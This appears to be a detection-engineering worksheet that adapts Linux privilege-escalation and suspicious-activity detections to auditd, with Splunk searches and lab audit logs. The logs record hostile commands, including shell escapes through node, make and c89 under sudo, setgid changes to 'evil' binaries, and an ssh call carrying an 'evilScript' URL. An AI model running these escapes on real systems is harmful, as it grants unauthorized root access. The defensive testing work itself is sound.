type=SYSCALL msg=audit(03/20/2023 09:43:09.295:1023) : arch=x86_64 syscall=execve success=yes exit=0 a0=0x211b3b0 a1=0x211ab60 a2=0x20f2ee0 a3=0x7ffd64800220 items=2 ppid=1356 pid=3280 auid=test-2 uid=test-2 gid=test-2 euid=test-2 suid=test-2 fsuid=test-2 egid=test-2 sgid=test-2 fsgid=test-2 tty=pts0 ses=1 comm=ssh exe=/usr/bin/ssh subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 key=susp_activity 
type=PROCTITLE msg=audit(03/20/2023 09:43:09.295:1023) : proctitle=/usr/bin/ssh -oBatchMode=yes -oConnectTimeout=5 -oStrictHostKeyChecking=no root@192.168.56.102 http://example.com/evilScript 
type=SYSCALL msg=audit(03/20/2023 09:33:09.086:935) : arch=x86_64 syscall=execve success=yes exit=0 a0=0x211b390 a1=0x210bd10 a2=0x20f2ee0 a3=0x7ffd64800220 items=2 ppid=1356 pid=2651 auid=test-2 uid=test-2 gid=test-2 euid=test-2 suid=test-2 fsuid=test-2 egid=test-2 sgid=test-2 fsgid=test-2 tty=pts0 ses=1 comm=ssh exe=/usr/bin/ssh subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 key=susp_activity 
type=PROCTITLE msg=audit(03/20/2023 09:33:09.086:935) : proctitle=/usr/bin/ssh -oBatchMode=yes -oConnectTimeout=5 -oStrictHostKeyChecking=no root@192.168.56.102 http://example.com/evilScript 
type=SYSCALL msg=audit(03/20/2023 09:31:45.134:929) : arch=x86_64 syscall=execve success=yes exit=0 a0=0x211ad70 a1=0x210bee0 a2=0x20f2ee0 a3=0x7ffd64800220 items=2 ppid=1356 pid=2595 auid=test-2 uid=test-2 gid=test-2 euid=test-2 suid=test-2 fsuid=test-2 egid=test-2 sgid=test-2 fsgid=test-2 tty=pts0 ses=1 comm=ssh exe=/usr/bin/ssh subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 key=susp_activity 
type=PROCTITLE msg=audit(03/20/2023 09:31:45.134:929) : proctitle=/usr/bin/ssh -oBatchMode=yes -oConnectTimeout=5 -oStrictHostKeyChecking=no root@10.10.10.10 http://example.com/evilScript 
type=SYSCALL msg=audit(03/20/2023 09:31:40.042:928) : arch=x86_64 syscall=execve success=yes exit=0 a0=0x211b390 a1=0x211ab60 a2=0x20f2ee0 a3=0x7ffd64800220 items=2 ppid=1356 pid=2593 auid=test-2 uid=test-2 gid=test-2 euid=test-2 suid=test-2 fsuid=test-2 egid=test-2 sgid=test-2 fsgid=test-2 tty=pts0 ses=1 comm=ssh exe=/usr/bin/ssh subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 key=susp_activity 
type=PROCTITLE msg=audit(03/20/2023 09:31:40.042:928) : proctitle=/usr/bin/ssh -oBatchMode=yes -oConnectTimeout=5 -oStrictHostKeyChecking=no root@10.10.10.10 http://example.com/evilScript 

``` 



### Linux Make Privilege Escalation

Datamodel:   
Auditd config:   
CIM Mapping: 
Search:  

```
| tstats `security_content_summariesonly` count min(_time) as firstTime max(_time)
  as lastTime from datamodel=Endpoint.Processes where Processes.process="*make*-s*" AND Processes.process="*--eval*" by Processes.dest Processes.user Processes.parent_process_name
  Processes.process_name Processes.process Processes.process_id Processes.parent_process_id
  Processes.process_guid | `drop_dm_object_name(Processes)` | `security_content_ctime(firstTime)`
  | `security_content_ctime(lastTime)` | `linux_make_privilege_escalation_filter`
```

Limitations:   
Sample events:    

```
type=SYSCALL msg=audit(03/20/2023 09:21:25.100:580) : arch=x86_64 syscall=execve success=yes exit=0 a0=0x5555da7ef248 a1=0x5555da801198 a2=0x5555da814ef0 a3=0x0 items=2 ppid=1529 pid=1531 auid=test-2 uid=root gid=root euid=root suid=root fsuid=root egid=root sgid=root fsgid=root tty=pts0 ses=1 comm=make exe=/usr/bin/make subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 key=make_priv_escalation 
type=EXECVE msg=audit(03/20/2023 09:21:25.100:580) : argc=3 a0=make a1=-s a2=--eval=y: 
type=PATH msg=audit(03/20/2023 09:21:25.100:580) : item=0 name=/bin/make inode=100680824 dev=fd:00 mode=file,755 ouid=root ogid=root rdev=00:00 obj=system_u:object_r:bin_t:s0 objtype=NORMAL cap_fp=none cap_fi=none cap_fe=0 cap_fver=0 
type=PROCTITLE msg=audit(03/20/2023 09:21:25.100:580) : proctitle=make -s --eval=y: 
type=USER_CMD msg=audit(03/20/2023 09:21:25.090:577) : pid=1529 uid=test-2 auid=test-2 ses=1 subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 msg='cwd=/home/test-2 cmd=make -s --eval=y: terminal=pts/0 res=success' 
type=SYSCALL msg=audit(03/20/2023 09:21:16.241:573) : arch=x86_64 syscall=execve success=yes exit=0 a0=0x5574f6f0c248 a1=0x5574f6f1e198 a2=0x5574f6f31ef0 a3=0x0 items=2 ppid=1525 pid=1527 auid=test-2 uid=root gid=root euid=root suid=root fsuid=root egid=root sgid=root fsgid=root tty=pts0 ses=1 comm=make exe=/usr/bin/make subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 key=make_priv_escalation 
type=EXECVE msg=audit(03/20/2023 09:21:16.241:573) : argc=3 a0=make a1=-s a2=--eval=x: 
type=PATH msg=audit(03/20/2023 09:21:16.241:573) : item=0 name=/bin/make inode=100680824 dev=fd:00 mode=file,755 ouid=root ogid=root rdev=00:00 obj=system_u:object_r:bin_t:s0 objtype=NORMAL cap_fp=none cap_fi=none cap_fe=0 cap_fver=0 
type=PROCTITLE msg=audit(03/20/2023 09:21:16.241:573) : proctitle=make -s --eval=x: 

``` 

### Linux Node Privilege Escalation


Datamodel: 
Auditd config:   
CIM Mapping: 
Search:  Remove sudo  

```
| tstats summariesonly=f count min(_time) as firstTime max(_time)
  as lastTime from datamodel=Endpoint.Processes where Processes.process="*node*" AND Processes.process="*-e*" AND Processes.process="*child_process.spawn*" AND Processes.process="*stdio*" by Processes.dest Processes.user Processes.parent_process_name
  Processes.process_name Processes.process Processes.process_id Processes.parent_process_id
  Processes.process_guid | `drop_dm_object_name(Processes)` | `security_content_ctime(firstTime)`
  | `security_content_ctime(lastTime)` | `linux_node_privilege_escalation_filter`
```

Limitations:   
Sample events:    

```
type=SYSCALL msg=audit(03/19/2023 19:19:11.077:1494) : arch=x86_64 syscall=execve success=yes exit=0 a0=0x55e92fe10248 a1=0x55e92fe22198 a2=0x55e92fe35f40 a3=0x0 items=2 ppid=5010 pid=5012 auid=test-2 uid=root gid=root euid=root suid=root fsuid=root egid=root sgid=root fsgid=root tty=pts0 ses=1 comm=node exe=/usr/bin/node subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 key=node_priv_escalation 
type=EXECVE msg=audit(03/19/2023 19:19:11.077:1494) : argc=5 a0=node a1=-e a2=child_process.spawn(/bin/sh, a3={stdio: a4=[0,1,2]}) 
type=PATH msg=audit(03/19/2023 19:19:11.077:1494) : item=0 name=/bin/node inode=101196429 dev=fd:00 mode=file,755 ouid=root ogid=root rdev=00:00 obj=system_u:object_r:bin_t:s0 objtype=NORMAL cap_fp=none cap_fi=none cap_fe=0 cap_fver=0 
type=PROCTITLE msg=audit(03/19/2023 19:19:11.077:1494) : proctitle=node -e child_process.spawn(/bin/sh, {stdio: [0,1,2]}) 
type=USER_CMD msg=audit(03/19/2023 19:19:11.064:1491) : pid=5010 uid=test-2 auid=test-2 ses=1 subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 msg='cwd=/home/test-2 cmd=node -e child_process.spawn(/bin/sh, {stdio: [0,1,2]}) terminal=pts/0 res=success' 
type=SYSCALL msg=audit(03/19/2023 19:19:04.977:1486) : arch=x86_64 syscall=execve success=yes exit=0 a0=0x55832d31c248 a1=0x55832d32e198 a2=0x55832d341f40 a3=0x0 items=2 ppid=5004 pid=5006 auid=test-2 uid=root gid=root euid=root suid=root fsuid=root egid=root sgid=root fsgid=root tty=pts0 ses=1 comm=node exe=/usr/bin/node subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 key=node_priv_escalation 
type=EXECVE msg=audit(03/19/2023 19:19:04.977:1486) : argc=5 a0=node a1=-e a2=child_process.spawn(/bin/sh, a3={stdio: a4=[0,1,2]}) 
type=PATH msg=audit(03/19/2023 19:19:04.977:1486) : item=0 name=/bin/node inode=101196429 dev=fd:00 mode=file,755 ouid=root ogid=root rdev=00:00 obj=system_u:object_r:bin_t:s0 objtype=NORMAL cap_fp=none cap_fi=none cap_fe=0 cap_fver=0 
type=PROCTITLE msg=audit(03/19/2023 19:19:04.977:1486) : proctitle=node -e child_process.spawn(/bin/sh, {stdio: [0,1,2]}) 
type=USER_CMD msg=audit(03/19/2023 19:19:04.875:1483) : pid=5004 uid=test-2 auid=test-2 ses=1 subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 msg='cwd=/home/test-2 cmd=node -e child_process.spawn(/bin/sh, {stdio: [0,1,2]}) terminal=pts/0 res=success' 
type=SYSCALL msg=audit(03/19/2023 19:18:56.873:1477) : arch=x86_64 syscall=execve success=yes exit=0 a0=0x12dbb00 a1=0x13060f0 a2=0x12dbee0 a3=0x7ffecd4313a0 items=2 ppid=1338 pid=4950 auid=test-2 uid=test-2 gid=test-2 euid=test-2 suid=test-2 fsuid=test-2 egid=test-2 sgid=test-2 fsgid=test-2 tty=pts0 ses=1 comm=node exe=/usr/bin/node subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 key=node_priv_escalation 
type=EXECVE msg=audit(03/19/2023 19:18:56.873:1477) : argc=5 a0=node a1=-e a2=child_process.spawn(/bin/sh, a3={stdio: a4=[0,1,2]}) 
type=PATH msg=audit(03/19/2023 19:18:56.873:1477) : item=0 name=/usr/bin/node inode=101196429 dev=fd:00 mode=file,755 ouid=root ogid=root rdev=00:00 obj=system_u:object_r:bin_t:s0 objtype=NORMAL cap_fp=none cap_fi=none cap_fe=0 cap_fver=0 
type=PROCTITLE msg=audit(03/19/2023 19:18:56.873:1477) : proctitle=node -e child_process.spawn(/bin/sh, {stdio: [0,1,2]}) 
type=SYSCALL msg=audit(03/19/2023 19:17:35.433:1469) : arch=x86_64 syscall=execve success=yes exit=0 a0=0x55f707555248 a1=0x55f707567198 a2=0x55f70757bea0 a3=0x0 items=2 ppid=4889 pid=4893 auid=test-2 uid=root gid=root euid=root suid=root fsuid=root egid=root sgid=root fsgid=root tty=pts0 ses=1 comm=node exe=/usr/bin/node subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 key=node_priv_escalation 
type=EXECVE msg=audit(03/19/2023 19:17:35.433:1469) : argc=5 a0=node a1=-e a2=child_process.spawn(node, a3=[support.js, a4=i]) 
type=PATH msg=audit(03/19/2023 19:17:35.433:1469) : item=0 name=/bin/node inode=101196429 dev=fd:00 mode=file,755 ouid=root ogid=root rdev=00:00 obj=system_u:object_r:bin_t:s0 objtype=NORMAL cap_fp=none cap_fi=none cap_fe=0 cap_fver=0 
type=PROCTITLE msg=audit(03/19/2023 19:17:35.433:1469) : proctitle=node -e child_process.spawn(node, [support.js, i]) 
type=USER_CMD msg=audit(03/19/2023 19:17:35.421:1466) : pid=4889 uid=test-2 auid=test-2 ses=1 subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 msg='cwd=/home/test-2 cmd=node -e child_process.spawn(node, [support.js, i]) terminal=pts/0 res=success' 
type=SYSCALL msg=audit(03/19/2023 19:17:25.185:1463) : arch=x86_64 syscall=execve success=yes exit=0 a0=0x1304790 a1=0x12db720 a2=0x12dbee0 a3=0x7ffecd4313a0 items=2 ppid=1338 pid=4887 auid=test-2 uid=test-2 gid=test-2 euid=test-2 suid=test-2 fsuid=test-2 egid=test-2 sgid=test-2 fsgid=test-2 tty=pts0 ses=1 comm=node exe=/usr/bin/node subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 key=node_priv_escalation 

``` 


### Linux Setuid Using Chmod Utility

Datamodel:   
Auditd config:   
CIM Mapping: 
Search:  
Limitations:   
Sample events:    

```
type=SYSCALL msg=audit(03/19/2023 18:44:25.481:805) : arch=x86_64 syscall=execve success=yes exit=0 a0=0x12f43d0 a1=0x12f4450 a2=0x12dbee0 a3=0x7ffecd4313a0 items=2 ppid=1338 pid=2128 auid=test-2 uid=test-2 gid=test-2 euid=test-2 suid=test-2 fsuid=test-2 egid=test-2 sgid=test-2 fsgid=test-2 tty=pts0 ses=1 comm=chmod exe=/usr/bin/chmod subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 key=chmod 
type=EXECVE msg=audit(03/19/2023 18:44:25.481:805) : argc=3 a0=chmod a1=g+s a2=evil3_bin 
type=PATH msg=audit(03/19/2023 18:44:25.481:805) : item=0 name=/usr/bin/chmod inode=100817938 dev=fd:00 mode=file,755 ouid=root ogid=root rdev=00:00 obj=system_u:object_r:bin_t:s0 objtype=NORMAL cap_fp=none cap_fi=none cap_fe=0 cap_fver=0 
type=PROCTITLE msg=audit(03/19/2023 18:44:25.481:805) : proctitle=chmod g+s evil3_bin 
type=SYSCALL msg=audit(03/19/2023 18:44:17.982:802) : arch=x86_64 syscall=execve success=yes exit=0 a0=0x557bb79db248 a1=0x557bb79ed198 a2=0x557bb7a01e90 a3=0x0 items=2 ppid=2123 pid=2127 auid=test-2 uid=root gid=root euid=root suid=root fsuid=root egid=root sgid=root fsgid=root tty=pts0 ses=1 comm=chmod exe=/usr/bin/chmod subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 key=chmod 
type=EXECVE msg=audit(03/19/2023 18:44:17.982:802) : argc=3 a0=chmod a1=g+s a2=evil2_bin 
type=PATH msg=audit(03/19/2023 18:44:17.982:802) : item=0 name=/bin/chmod inode=100817938 dev=fd:00 mode=file,755 ouid=root ogid=root rdev=00:00 obj=system_u:object_r:bin_t:s0 objtype=NORMAL cap_fp=none cap_fi=none cap_fe=0 cap_fver=0 
type=PROCTITLE msg=audit(03/19/2023 18:44:17.982:802) : proctitle=chmod g+s evil2_bin 
type=USER_CMD msg=audit(03/19/2023 18:44:17.971:799) : pid=2123 uid=test-2 auid=test-2 ses=1 subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 msg='cwd=/home/test-2 cmd=chmod g+s evil2_bin terminal=pts/0 res=success' 

```  


### Linux Setuid Using Setcap Utility

Datamodel: Processes  
Auditd config:   
CIM Mapping: 
Search:  
Limitations:   
Sample events:    

```
type=USER_CMD msg=audit(03/19/2023 18:37:35.526:509) : pid=1474 uid=test-2 auid=test-2 ses=1 subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 msg='cwd=/home/test-2 cmd=setcap cap_net_raw+ep ./hello_test2 terminal=pts/0 res=success' 

```  



### Linux Sudo OR Su Execution

Datamodel: 
Auditd config:   
CIM Mapping: 
Search:  
Limitations:   
Sample events:    

```
type=CRED_DISP msg=audit(03/17/2023 18:04:06.482:2402) : pid=9792 uid=test-2 auid=test-2 ses=2 subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 msg='op=PAM:setcred grantors=pam_unix acct=test-3 exe=/usr/bin/su hostname=localhost.localdomain addr=? terminal=pts/1 res=success' 
type=USER_END msg=audit(03/17/2023 18:04:06.482:2401) : pid=9792 uid=test-2 auid=test-2 ses=2 subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 msg='op=PAM:session_close grantors=pam_keyinit,pam_keyinit,pam_limits,pam_systemd,pam_unix,pam_xauth acct=test-3 exe=/usr/bin/su hostname=localhost.localdomain addr=? terminal=pts/1 res=success' 
type=USER_START msg=audit(03/17/2023 18:04:04.188:2400) : pid=9792 uid=test-2 auid=test-2 ses=2 subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 msg='op=PAM:session_open grantors=pam_keyinit,pam_keyinit,pam_limits,pam_systemd,pam_unix,pam_xauth acct=test-3 exe=/usr/bin/su hostname=localhost.localdomain addr=? terminal=pts/1 res=success' 
type=CRED_ACQ msg=audit(03/17/2023 18:04:04.179:2399) : pid=9792 uid=test-2 auid=test-2 ses=2 subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 msg='op=PAM:setcred grantors=pam_unix acct=test-3 exe=/usr/bin/su hostname=localhost.localdomain addr=? terminal=pts/1 res=success' 
type=USER_ACCT msg=audit(03/17/2023 18:04:04.179:2398) : pid=9792 uid=test-2 auid=test-2 ses=2 subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 msg='op=PAM:accounting grantors=pam_unix,pam_localuser acct=test-3 exe=/usr/bin/su hostname=localhost.localdomain addr=? terminal=pts/1 res=success' 
type=USER_AUTH msg=audit(03/17/2023 18:04:04.143:2397) : pid=9792 uid=test-2 auid=test-2 ses=2 subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 msg='op=PAM:authentication grantors=pam_unix acct=test-3 exe=/usr/bin/su hostname=localhost.localdomain addr=? terminal=pts/1 res=success' 
type=CRED_DISP msg=audit(03/17/2023 18:04:00.043:2396) : pid=9775 uid=root auid=test-2 ses=2 subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 msg='op=PAM:setcred grantors=pam_env,pam_unix acct=root exe=/usr/bin/sudo hostname=? addr=? terminal=/dev/pts/1 res=success' 
type=USER_END msg=audit(03/17/2023 18:04:00.043:2395) : pid=9775 uid=root auid=test-2 ses=2 subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 msg='op=PAM:session_close grantors=pam_keyinit,pam_keyinit,pam_keyinit,pam_limits,pam_systemd,pam_unix acct=root exe=/usr/bin/sudo hostname=? addr=? terminal=/dev/pts/1 res=success' 
type=USER_START msg=audit(03/17/2023 18:03:57.242:2393) : pid=9775 uid=root auid=test-2 ses=2 subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 msg='op=PAM:session_open grantors=pam_keyinit,pam_keyinit,pam_keyinit,pam_limits,pam_systemd,pam_unix acct=root exe=/usr/bin/sudo hostname=? addr=? terminal=/dev/pts/1 res=success' 
type=CRED_REFR msg=audit(03/17/2023 18:03:57.228:2392) : pid=9775 uid=root auid=test-2 ses=2 subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 msg='op=PAM:setcred grantors=pam_env,pam_unix acct=root exe=/usr/bin/sudo hostname=? addr=? terminal=/dev/pts/1 res=success' 
type=USER_ACCT msg=audit(03/17/2023 18:03:57.228:2390) : pid=9775 uid=test-2 auid=test-2 ses=2 subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 msg='op=PAM:accounting grantors=pam_unix,pam_localuser acct=test-2 exe=/usr/bin/sudo hostname=? addr=? terminal=/dev/pts/1 res=success' 
type=CRED_DISP msg=audit(03/17/2023 18:00:56.132:2359) : pid=9514 uid=test-2 auid=test-2 ses=2 subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 msg='op=PAM:setcred grantors=pam_unix acct=test-3 exe=/usr/bin/su hostname=localhost.localdomain addr=? terminal=pts/1 res=success' 
type=USER_END msg=audit(03/17/2023 18:00:56.132:2358) : pid=9514 uid=test-2 auid=test-2 ses=2 subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 msg='op=PAM:session_close grantors=pam_keyinit,pam_keyinit,pam_limits,pam_systemd,pam_unix,pam_xauth acct=test-3 exe=/usr/bin/su hostname=localhost.localdomain addr=? terminal=pts/1 res=success' 
type=USER_START msg=audit(03/17/2023 18:00:54.638:2353) : pid=9514 uid=test-2 auid=test-2 ses=2 subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 msg='op=PAM:session_open grantors=pam_keyinit,pam_keyinit,pam_limits,pam_systemd,pam_unix,pam_xauth acct=test-3 exe=/usr/bin/su hostname=localhost.localdomain addr=? terminal=pts/1 res=success' 
type=CRED_ACQ msg=audit(03/17/2023 18:00:54.631:2352) : pid=9514 uid=test-2 auid=test-2 ses=2 subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 msg='op=PAM:setcred grantors=pam_unix acct=test-3 exe=/usr/bin/su hostname=localhost.localdomain addr=? terminal=pts/1 res=success' 
type=USER_ACCT msg=audit(03/17/2023 18:00:54.631:2351) : pid=9514 uid=test-2 auid=test-2 ses=2 subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 msg='op=PAM:accounting grantors=pam_unix,pam_localuser acct=test-3 exe=/usr/bin/su hostname=localhost.localdomain addr=? terminal=pts/1 res=success' 
type=USER_AUTH msg=audit(03/17/2023 18:00:54.580:2350) : pid=9514 uid=test-2 auid=test-2 ses=2 subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 msg='op=PAM:authentication grantors=pam_unix acct=test-3 exe=/usr/bin/su hostname=localhost.localdomain addr=? terminal=pts/1 res=success' 
type=CRED_DISP msg=audit(03/17/2023 18:00:49.683:2349) : pid=9497 uid=root auid=test-2 ses=2 subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 msg='op=PAM:setcred grantors=pam_unix acct=root exe=/usr/bin/sudo hostname=? addr=? terminal=/dev/pts/1 res=success' 
type=USER_END msg=audit(03/17/2023 18:00:49.683:2348) : pid=9497 uid=root auid=test-2 ses=2 subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 msg='op=PAM:session_close grantors=pam_keyinit,pam_keyinit,pam_keyinit,pam_limits,pam_systemd,pam_unix acct=root exe=/usr/bin/sudo hostname=? addr=? terminal=/dev/pts/1 res=success' 
type=USER_START msg=audit(03/17/2023 18:00:44.544:2347) : pid=9497 uid=root auid=test-2 ses=2 subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 msg='op=PAM:session_open grantors=pam_keyinit,pam_keyinit,pam_keyinit,pam_limits,pam_systemd,pam_unix acct=root exe=/usr/bin/sudo hostname=? addr=? terminal=/dev/pts/1 res=success' 

``` 


### Linux Stop Services

Datamodel: 
Auditd config:   
CIM Mapping: 
Search:  
Limitations:   
Sample events:    

```
type=EXECVE msg=audit(03/17/2023 17:33:39.991:2116) : argc=3 a0=systemctl a1=stop a2=httpd 
type=PROCTITLE msg=audit(03/17/2023 17:33:39.991:2116) : proctitle=systemctl stop httpd 
type=USER_CMD msg=audit(03/17/2023 17:33:39.977:2113) : pid=7765 uid=test-2 auid=test-2 ses=2 subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 msg='cwd=/home/test-2 cmd=systemctl stop httpd terminal=pts/1 res=success' 

``` 


### Linux Service Restarted

Datamodel: Processes  
Auditd config: Yes    
CIM Mapping:   
Search:  
Limitations:   
Sample events:    

```
type=EXECVE msg=audit(03/17/2023 17:35:12.741:2144) : argc=3 a0=systemctl a1=restart a2=httpd 
type=PROCTITLE msg=audit(03/17/2023 17:35:12.741:2144) : proctitle=systemctl restart httpd 
type=USER_CMD msg=audit(03/17/2023 17:35:12.677:2141) : pid=7915 uid=test-2 auid=test-2 ses=2 subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 msg='cwd=/home/test-2 cmd=systemctl restart httpd terminal=pts/1 res=success' 
type=EXECVE msg=audit(03/17/2023 17:33:39.991:2116) : argc=3 a0=systemctl a1=stop a2=httpd 
type=PROCTITLE msg=audit(03/17/2023 17:33:39.991:2116) : proctitle=systemctl stop httpd 
type=USER_CMD msg=audit(03/17/2023 17:33:39.977:2113) : pid=7765 uid=test-2 auid=test-2 ses=2 subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 msg='cwd=/home/test-2 cmd=systemctl stop httpd terminal=pts/1 res=success' 

```  


### Linux Doas Tool Execution

Can't install on Centos7 

```

```  

### Linux Possible Ssh Key File Creation

Auditd config: Yes (-w /root/.ssh -p wa -k rootkey)  
CIM Mapping: file_path, dest file_name, process_guid. 
Search: No change. 
Limitations: The auditd configuration for this rule only audits root user keys (changes in /root/.ssh/ directory). Other user accounts are not picked up (e.g. /home/testUser/.ssh/). It may be possible to monitor /home.  
Known false positives:-   
Sample events:  
```
type=PATH msg=audit(01/22/2023 03:44:58.662:5955) : item=0 name=/root/.ssh/ inode=33563192 dev=fd:00 mode=dir,700 ouid=root ogid=root rdev=00:00 obj=unconfined_u:object_r:ssh_home_t:s0 objtype=PARENT cap_fp=none cap_fi=none cap_fe=0 cap_fver=0 
type=PATH msg=audit(01/22/2023 03:44:58.662:5955) : item=1 name=/root/.ssh/testfile inode=33563185 dev=fd:00 mode=file,644 ouid=root ogid=root rdev=00:00 obj=unconfined_u:object_r:ssh_home_t:s0 objtype=CREATE cap_fp=none cap_fi=none cap_fe=0 cap_fver=0 
type=PROCTITLE msg=audit(01/22/2023 03:44:58.662:5955) : proctitle=touch /root/.ssh/testfile 
```

### Linux c89 Privilege Escalation

Datamodel: Processes  
Auditd config: Yes    
CIM Mapping: Processes.dest Processes.user Processes.parent_process_name Processes.process_name Processes.process Processes.process_id Processes.parent_process_id Processes.process_guid  
Search: Change required, remove sudo/mapping condition

```
| tstats `security_content_summariesonly` count min(_time) as firstTime max(_time) as lastTime from datamodel=Endpoint.Processes where Processes.process="*c89*"  by Processes.dest Processes.user Processes.parent_process_name Processes.process_name Processes.process Processes.process_id Processes.parent_process_id Processes.process_guid | `drop_dm_object_name(Processes)` | `security_content_ctime(firstTime)`
```

Limitations: legitimate usage of c89  
Sample events:    

```
type=SYSCALL msg=audit(03/16/2023 15:02:05.411:644) : arch=x86_64 syscall=execve success=yes exit=0 a0=0x557c7e50d248 a1=0x557c7e51f1c8 a2=0x557c7e533ed0 a3=0x0 items=3 ppid=6378 pid=6382 auid=test-2 uid=root gid=root euid=root suid=root fsuid=root egid=root sgid=root fsgid=root tty=pts1 ses=2 comm=c89 exe=/usr/bin/bash subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 key=c89 
type=EXECVE msg=audit(03/16/2023 15:02:05.411:644) : argc=5 a0=/bin/sh a1=/bin/c89 a2=-wrapper a3=/bin/sh,-s a4=. 
type=PATH msg=audit(03/16/2023 15:02:05.411:644) : item=0 name=/bin/c89 inode=101123552 dev=fd:00 mode=file,755 ouid=root ogid=root rdev=00:00 obj=system_u:object_r:bin_t:s0 objtype=NORMAL cap_fp=none cap_fi=none cap_fe=0 cap_fver=0 
type=PROCTITLE msg=audit(03/16/2023 15:02:05.411:644) : proctitle=/bin/sh /bin/c89 -wrapper /bin/sh,-s . 
type=USER_CMD msg=audit(03/16/2023 15:02:05.411:641) : pid=6378 uid=test-2 auid=test-2 ses=2 subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 msg='cwd=/home/test-2 cmd=c89 -wrapper /bin/sh,-s . terminal=pts/1 res=success' 

```  

### Linux NOPASSWD Entry In Sudoers File

Datamodel: Processes AND/OR Filesystem
Auditd config: Yes  
CIM Mapping:   
Search: The search provided will not work with auditd since it is looking for result of echo command. As alternative auditd will monitor the sudoers/sudoers.d file/directory for changed not specific to NOPASSWD but any change. Processes datamodel will can monitor usage of visudo executable.

```
| tstats `security_content_summariesonly` count min(_time) as firstTime max(_time) as lastTime from datamodel=Endpoint.Processes where Processes.process = "*visudo*" by Processes.dest Processes.user Processes.parent_process_name Processes.process_name Processes.process Processes.process_id Processes.parent_process_id Processes.process_guid | `drop_dm_object_name(Processes)` | `security_content_ctime(firstTime)` | `security_content_ctime(lastTime)` | `linux_nopasswd_entry_in_sudoers_file_filter`
```
```
| tstats `security_content_summariesonly` count min(_time) as firstTime max(_time) as lastTime FROM datamodel=Endpoint.Filesystem where Filesystem.file_path IN ("*sudoers*") by Filesystem.dest Filesystem.file_create_time Filesystem.file_name Filesystem.process_guid Filesystem.file_path | `drop_dm_object_name(Filesystem)` | `security_content_ctime(lastTime)` | `security_content_ctime(firstTime)` | `linux_add_files_in_known_crontab_directories_filter`
```

Limitations: This will monitor any changes to sudoers/sudoers.d in Filesystem datamodel and visudo in Processes datamodel 
Sample events:    

visudo:
```
type=SYSCALL msg=audit(03/03/2023 19:08:13.691:1637) : arch=x86_64 syscall=rename success=yes exit=0 a0=0x5579997b28f0 a1=0x5579997b1c40 a2=0x0 a3=0x7fa21b65e570 items=5 ppid=14249 pid=14253 auid=test-2 uid=root gid=root euid=root suid=root fsuid=root egid=root sgid=root fsgid=root tty=pts1 ses=42 comm=visudo exe=/usr/sbin/visudo subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 key=actions 
type=PROCTITLE msg=audit(03/03/2023 19:08:13.691:1637) : proctitle=visudo 
type=SYSCALL msg=audit(03/03/2023 19:08:06.713:1636) : arch=x86_64 syscall=open success=yes exit=3 a0=0x5579997b1c40 a1=O_RDWR|O_CREAT a2=0440 a3=0x2 items=2 ppid=14249 pid=14253 auid=test-2 uid=root gid=root euid=root suid=root fsuid=root egid=root sgid=root fsgid=root tty=pts1 ses=42 comm=visudo exe=/usr/sbin/visudo subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 key=actions 
type=PROCTITLE msg=audit(03/03/2023 19:08:06.713:1636) : proctitle=visudo 
type=SYSCALL msg=audit(03/03/2023 19:08:06.713:1635) : arch=x86_64 syscall=execve success=yes exit=0 a0=0x55f762084248 a1=0x55f762096198 a2=0x55f7620aae60 a3=0x0 items=2 ppid=14249 pid=14253 auid=test-2 uid=root gid=root euid=root suid=root fsuid=root egid=root sgid=root fsgid=root tty=pts1 ses=42 comm=visudo exe=/usr/sbin/visudo subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 key=visudo 
